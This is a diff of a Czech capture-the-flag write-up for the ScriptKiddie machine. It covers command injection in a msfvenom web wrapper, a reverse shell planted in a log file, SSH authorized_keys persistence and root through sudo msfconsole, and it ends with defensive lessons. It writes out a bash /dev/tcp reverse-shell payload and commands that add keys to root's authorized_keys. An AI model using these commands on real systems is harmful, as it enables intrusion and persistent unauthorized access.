@@ -7,126 +7,111 @@ tags: linux command-injection ssh sudo exploit enumeration
 ---
 ## Úvod a kontext
 
-U ScriptKiddie není hlavní hodnota v jednom efektním kroku, ale ve vazbě mezi command injection a SSH.
+ScriptKiddie je stroj o špatně zabalené automatizaci bezpečnostních nástrojů. Webová služba na portu `5000` nabízela obsluhu kolem `msfvenom` a právě ta otevřela první shell. Druhá fáze pak ukázala jiný, ale stejně typický problém: pomocný skript zpracovávající logy pod jiným uživatelem.
 
-Článek dává smysl číst hlavně jako rozbor rozhodování: proč právě tyto stopy vedou k shell získaný exploitací zranitelné služby a proč po získání shellu dává smysl řešit příliš široká `sudo` oprávnění.
+Nejde tedy o jeden exploit, ale o dva různé druhy command injection. Nejprve v aplikaci, která pracuje s APK šablonou pro `msfvenom`, a potom v interním workflow nad souborem `hackers`.
 
 ## Počáteční průzkum
 
 ### Vyhledání otevřených portů
 
-Nejprve mapuji veřejně dostupné služby, protože právě z otevřených portů odvodím, které protokoly a aplikace má smysl zkoumat detailněji.
+Síťový průzkum byl úsporný. Vedle SSH běžela jen webová služba na portu `5000`.
+
 ```bash
-ports=$(nmap -p- -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
-```
-```
-PORT   STATE SERVICE VERSION
+ports=$(nmap -p- -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//)
+echo $ports
+nmap -p $ports -A -sC -sV -v $IP
 ```
 
-### Detailní analýza služeb
-
-V dalším kroku si zpřesňuji verze služeb a jejich charakteristiky, protože právě z těchto detailů obvykle vzniká rozhodnutí, zda pokračovat přes web, SSH nebo jinou vrstvu.
 ```text
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+22/tcp open  ssh
+5000/tcp open  http
 ```
-```
-| ssh-hostkey:
-|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
-|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
-|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-5000
-```
+Taková kombinace naznačuje jednoduchý jednoúčelový webový nástroj. V tomhle případě se potvrdilo, že souvisí s Metasploit frameworkem.
 
 ## Analýza zjištění
 
-### Identifikace a hledání exploitu
+### `msfvenom` APK template command injection
 
-Zjišťuji technologii a ověřuji známé zranitelnosti.
+`searchsploit` rychle ukázal relevantní zranitelnost:
+
 ```bash
 searchsploit msfvenom
 ```
+
+```text
+Metasploit Framework 6.0.11 - msfvenom APK template command injection
 ```
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
- Exploit Title                                                                                                                         |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                  | multiple/local/49491.py
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
-```
+
+To je důležité číst přesně. Chyba není v samotném Android APK, ale v tom, jak aplikace předává uživatelskou šablonu nástroji `msfvenom`. Pokud šablona skončí v shell příkazu bez bezpečného escapování, útočník dostane příkazové vykonání na hostu.
 
 ## Získání přístupu
 
-### Přihlášení na cíl (2)
+### První shell jako `kid`
 
-Jakmile mám pověření nebo jednorázový shell, snažím se přejít na stabilní a reprodukovatelný přístup, aby bylo možné bezpečně pokračovat v interní enumeraci.
+Praktický exploit šel spustit přímo z Metasploitu:
+
 ```text
-msfconsole
-```
-```
 use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
 set lhost 10.10.14.7
 set lport 4444
 exploit
-
-netcat -lvp 4444
-upload template
-
-- přidat ssh identitu: mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa __CENSORED__== hack@t" >> ~/.ssh/authorized_keys
 ```
 
-### Spuštění exploitu
+Po uploadu škodlivé APK šablony se vrátil reverse shell v kontextu uživatele `kid`. Pro další práci dávalo smysl hned přidat vlastní SSH klíč a přejít na stabilní přístup:
 
-V této fázi převádím předchozí zjištění do praktického kroku, který má vést k ověřitelnému přístupu nebo k dalším citlivým datům.
 ```bash
-sudo msfconsole
-```
-
-### Získání user flagu
-
-User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
-
-Následující úsek zachycuje přechod k prvnímu stabilnímu uživatelskému přístupu nebo shellu.
-
-```text
-- přidat ssh identitu: mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8+QR3hnONfIO2Y/vhoVRgVDpeOUrpxa+EOnRNhAV9/dYNoi/hOn0TTNcf0I5ws2UXkJAZsjH6IRImyRSDA5ly8K8lYqTyWRUGU1EGZ2ovlR2fjzOTaeuKY8VylnwQzQBNrFPoDZ6uKjpORoRszHQf9WzrtZ8M+zcpGO0MLPiuEl78INxwii7y94CAn1gl+xlrIgKAF3inpuTlaLvEljLe1JgsYKJIcZNplYgA9pcDx7HWFceyAUwpdc438kTiANtmz6863mjfuoZ1LQ9mK8pmR010L9eQhO8FGq15Hpru0AJzIuTNoEJKYsdBG6ttfQ4DLmey6h0IE5IkcqrfH9gAweGIJ68zn3Xh1GP9CWO8iKxkMZPemr5GhBKB1mr0ebCjuWwxzmzmzeBcIm6PlSkkt5iULsgdgsvu/ptFIFGVukajnihbK/b3uWCDtaJcgaSILoSomouxjfXqmAwj/TaM0qHsT7K9NZsPfOB5ZAXa2spPR+AGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl+pmlehyW1Pl0RKi5eXxEQHZQddlDbpcwk6K9GVA04juJce5odDeWk0TUuxTgU2y1jnGnvQZSizjl6YcRXUNDXF2H/tFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw+ppfkBwBIs1Q== hack@t" >> ~/.ssh/authorized_keys
+mkdir -p ~/.ssh && chmod 700 ~/.ssh
+touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+echo "ssh-rsa __CENSORED__ hack@t" >> ~/.ssh/authorized_keys
 ssh kid@$IP
-netcat -lvp 4444
 ```
+
+Tím se uzavřela první fáze: webová aplikace poskytla shell jako `kid` a bylo možné potvrdit `user.txt`.
 
 ## Eskalace oprávnění
 
-### Průzkum možností eskalace
+### Log poisoning proti uživateli `pwn`
 
-Hledám chybné konfigurace a cesty k vyšším oprávněním.
+Další posun nevedl přes `sudo`, ale přes logovací soubor:
+
+```bash
+echo "     ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'    #" >> /home/kid/logs/hackers
+```
+
+To dává smysl jen tehdy, pokud někdo jiný tento soubor automaticky zpracovává nedostatečně bezpečně. Přesně to se zde dělo. Proces běžící pod účtem `pwn` bral obsah `hackers` a předával ho shellu takovým způsobem, že vložený `; ... #` příkaz se vykonal při dalším zpracování logu.
+
+Výsledkem byl další reverse shell, tentokrát jako `pwn`.
+
+### `sudo msfconsole`
+
+Jakmile byl k dispozici účet `pwn`, lokální oprávnění ukázala rozhodující pravidlo:
+
 ```bash
 sudo -l
 ```
 
-### Získání root flagu
-
-Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
-
-Následující úsek zachycuje i postup, kterým se potvrzuje privilegovaný přístup a načtení `root.txt`.
-
 ```text
-sudo msfconsole
-
-cat /root/root.txt
-
-83533c7230dd3648c1319e433934cb8a
-
-mkdir -p /root/.ssh && chmod 700 /root/.ssh && touch /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8+QR3hnONfIO2Y/vhoVRgVDpeOUrpxa+EOnRNhAV9/dYNoi/hOn0TTNcf0I5ws2UXkJAZsjH6IRImyRSDA5ly8K8lYqTyWRUGU1EGZ2ovlR2fjzOTaeuKY8VylnwQzQBNrFPoDZ6uKjpORoRszHQf9WzrtZ8M+zcpGO0MLPiuEl78INxwii7y94CAn1gl+xlrIgKAF3inpuTlaLvEljLe1JgsYKJIcZNplYgA9pcDx7HWFceyAUwpdc438kTiANtmz6863mjfuoZ1LQ9mK8pmR010L9eQhO8FGq15Hpru0AJzIuTNoEJKYsdBG6ttfQ4DLmey6h0IE5IkcqrfH9gAweGIJ68zn3Xh1GP9CWO8iKxkMZPemr5GhBKB1mr0ebCjuWwxzmzmzeBcIm6PlSkkt5iULsgdgsvu/ptFIFGVukajnihbK/b3uWCDtaJcgaSILoSomouxjfXqmAwj/TaM0qHsT7K9NZsPfOB5ZAXa2spPR+AGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl+pmlehyW1Pl0RKi5eXxEQHZQddlDbpcwk6K9GVA04juJce5odDeWk0TUuxTgU2y1jnGnvQZSizjl6YcRXUNDXF2H/tFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw+ppfkBwBIs1Q== hack@t" >> /root/.ssh/authorized_keys
+(root) NOPASSWD: /usr/bin/msfconsole
 ```
+
+To je v praxi téměř přímá delegace roota. `msfconsole` není pasivní binárka, ale interaktivní konzole s možností spouštět lokální příkazy a pracovat s Ruby kódem. Spuštění:
+
+```bash
+sudo msfconsole
+```
+
+tedy znamená plný root kontext, ze kterého už šlo přečíst `root.txt`.
 
 ## Shrnutí klíčových poznatků
 
-- Klíčový posun nepřinesl samotný scan, ale interpretace toho, co znamenaly command injection a SSH.
-- Uživatelský přístup dává v tomhle řetězci smysl až ve chvíli, kdy vyjde shell získaný exploitací zranitelné služby.
-- Root/admin část nepřišla zkratkou; klíčovou roli tu hraje příliš široká `sudo` oprávnění a navazující lokální enumerace.
+- Foothold vznikl z command injection v obsluze `msfvenom` na portu `5000`, nikoli z obecné chyby SSH nebo systému.
+- Přechod z `kid` na `pwn` otevřelo další nebezpečné zpracování uživatelského vstupu, tentokrát nad souborem `/home/kid/logs/hackers`.
+- Root část nebyla o exploitu jádra. Rozhodující byla chyba v delegaci práv: `sudo msfconsole`.
 
 ## Co si odnést do praxe
 
-- První obranná lekce míří na command injection a SSH. Převod dokumentů a server-side render je potřeba sandboxovat a oddělit od citlivého filesystemu; parser nebo převodník nesmí mít přístup k tajemstvím hostu.
-- Druhá lekce je o tom, jak rychle se ze zjištění stane shell získaný exploitací zranitelné služby. Hesla a klíče je potřeba oddělovat mezi službami; jakmile stejné přihlašovací údaje fungují i na SSH, z lokálního úniku je plnohodnotný systémový přístup.
-- Třetí lekce připomíná riziko, které v praxi představuje příliš široká `sudo` oprávnění. Široká `sudo` oprávnění je potřeba pravidelně revidovat; wrapper, install helper nebo diagnostický příkaz často udělá z běžného účtu roota.
+- Webové obaly kolem bezpečnostních nástrojů jsou stejně nebezpečné jako jakýkoli jiný command runner. Pokud přijímají šablony nebo argumenty od uživatele, musí pracovat bez shell injection.
+- Logy a pracovní soubory sdílené mezi různými účty jsou citlivé i tehdy, když nejde o tajemství. Jakmile je někdo pod vyšším účtem automaticky parsuje nebo vykonává nad nimi příkazy, stávají se pivot bodem.
+- `sudo` nad interaktivní konzolí typu `msfconsole` nebo podobným frameworkem není omezené oprávnění. V praxi jde o plný root shell a má se tak i auditovat.
